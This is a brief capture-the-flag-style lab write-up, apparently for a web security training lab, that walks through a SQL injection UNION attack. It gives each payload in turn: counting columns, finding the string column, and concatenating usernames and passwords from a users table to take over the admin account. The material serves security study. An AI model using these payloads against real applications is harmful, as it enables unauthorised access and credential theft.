
### SQL injection UNION attack, retrieving multiple values in a single column : PRACTITIONER

---

> Get the number of columns.
```
' UNION SELECT NULL, NULL--
```
> They are 2.

> Identify the data types.
```
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'--
```
> The second item only is of type string.

> Get the username and password texts both concatenated in the second field.
```
' UNION SELECT NULL, username || ':' || password FROM users--
```

> Get the admin password and login to complete the lab.

---
